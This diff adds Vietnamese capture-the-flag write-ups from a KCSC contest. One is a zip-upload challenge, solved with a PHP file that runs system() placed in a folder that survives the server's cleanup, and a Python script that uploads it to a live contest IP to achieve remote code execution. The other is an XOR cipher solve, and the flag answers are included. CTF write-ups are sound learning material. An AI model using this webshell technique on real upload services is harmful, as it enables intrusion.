@@ -127,3 +127,151 @@ Sau 1 lúc thì có flag:
 ![image](https://user-images.githubusercontent.com/96786536/165209793-d51b1a7c-7639-4e7b-ab7d-971f86079c26.png)
 
 Flag: `KCSC{Pl3as3_d0nt_st0r3_th3_s3cr3t_k3y_1n_cl1ent-s1d3_scr1pt!!}`
+
+## Host_timescale 9999
+
+Description:
+
+1 trang web có chức năng upload file image hoặc zip, nếu là file image thì nó sẽ thực hiện lưu vào và in ra list trên trang chủ.
+
+Solution:
+
+Phân tích source có 1 số điểm đáng chú ý là: đầu tiên là trang web sẽ filter extension bằng white list các extension image, tiếp theo nếu là file zip thì nó sẽ thực hiên lưu file zip rồi sau đó unzip file đó, sau khi unzip thì sẽ xóa các file vừa được unzip.
+
+```php
+    function getFileinPath($path){
+        $files = array_diff(scandir($path), array('..', '.'));
+
+        foreach ($files as $key => $value) {
+            // get file extension
+            $extension = pathinfo($value, PATHINFO_EXTENSION);
+            if (isImg($extension)){
+                if(!copyfile($path, $value)){
+                    die("Error: copy file failed");
+                    exit();
+                }
+            }
+            // delete file
+            unlink($path ."/". $value);
+        }
+    }
+```
+
+web sử dụng `unlink` để có thể xóa file. Nhưng chỉ là xóa file nếu nó là folder thì sao ?
+
+![image](https://user-images.githubusercontent.com/96786536/165211711-f9ce3f7f-1c66-481d-b4aa-575620e44b0d.png)
+
+`unlink` xóa file nhưng có vẻ không xóa folder. Vậy thì chúng ta có thể tạo 1 folder có chứa file php thực hiện RCE. Rồi zip folder đó. Khi mà server thực hiện unzip và unlink thì folder đó vẫn còn trên server, truy cập folder đó là RCE.
+
+Đã lên được ý tưởng rồi thì thực hành thôi.
+
+tạo 1 file php lưu vào folder có tên a:
+
+```php
+<?php
+
+system('cat ../flag.txt');
+
+?>
+```
+
+Script thực hiện upload file và lấy flag:
+
+```python
+
+import requests
+
+FLAG = "KCSC{Brrrrrrrrr_Beyond_the_sp33d0fLight____}"
+
+url = "http://139.180.134.15:10000/"
+
+res = requests.post(url + "upload.php", files={'file2upload': open('a.zip', 'rb')})
+
+res = requests.get(url + "upload/zip/unzipped/a").text
+
+print(res)
+
+```
+
+FLAG: `KCSC{Brrrrrrrrr_Beyond_the_sp33d0fLight____}`
+
+## XOXO
+
+Description:
+
+Đây là 1 bài crypto mình làm được. Author cho 1 file python có chức năng mã hóa.
+
+Solution:
+
+```python
+from secret import FLAG
+import random
+assert FLAG.startswith(b"KCSC{")
+
+def xor(a,b):
+    return bytes([x^y for x,y in zip(a,b)])
+
+def encrypt(msg,key):
+    msg = msg + bytes(len(key) - (len(msg) % len(key)))
+    msg = [msg[i:i+len(key)] for i in range(0,len(msg),len(key))]
+    c = []
+    for m in msg:
+        c.append(xor(m,key))
+        key = xor(m,key)
+    random.shuffle(c)
+    return b''.join(c).hex()
+
+key = random.randbytes(5)
+c = encrypt(FLAG,key)
+print(c)
+
+# cd8fa01b3db9a1f0374992ce930508d6e3d65f39a2bce73166e191a268789591af2f4da5f6dd1b3d
+```
+
+Phân tích qua về cách mã hóa thì FLAG khi được đưa vào hàm encrypt thì sẽ cắt thành các khối bằng nhau có độ dài bằng với độ dài của key (độ dài của key bằng 5). Về cách thức mã hóa thì khối đầu tiên sẽ được xor với key ban đầu, các khối tiếp theo sẽ được xor với `key=xor(m, key)` tức là cipher_text của khối trước. Sau đó random các khối sau khi được mã hóa trong mảng c.
+
+Ý tưởng để lấy được flag là ta sẽ thực hiện xor các khối với nhau để lấy từng phần của flag.
+
+Script giải mã:
+```python
+def xor(x1, x2):
+    return "".join(chr(ord(a) ^ ord(b)) for a, b in zip(x1, x2))
+
+cipher_text = "cd8fa01b3db9a1f0374992ce930508d6e3d65f39a2bce73166e191a268789591af2f4da5f6dd1b3d"
+
+arr = []
+arr.append(cipher_text[0:10])
+arr.append(cipher_text[10:20])
+arr.append(cipher_text[20:30])
+arr.append(cipher_text[30:40])
+arr.append(cipher_text[40:50])
+arr.append(cipher_text[50:60])
+arr.append(cipher_text[60:70])
+arr.append(cipher_text[70:80])
+
+f = open("a.txt", "w")
+for a in arr:
+    for b in arr:
+        try:
+            str = xor(a.decode("hex"), b.decode("hex"))
+            f.write(str + "\n")
+            print(a, b, str)
+        except:
+            print(a, b, str)
+
+```
+
+Sau khi chạy nó sẽ ra 1 đống các chuỗi khác nhau, lọc 1 hồi thì được các phân của FLAG như sau:
+
+```
+hy}
+X0R_1
+0rt4n
+s_1mp
+t_1n_
+Crypt
+0gr4p
+KCSC{
+```
+Ghép lại và được flag: `KCSC{X0R_1s_1mp0rt4nt_1n_Crypt0gr4phy}`
+
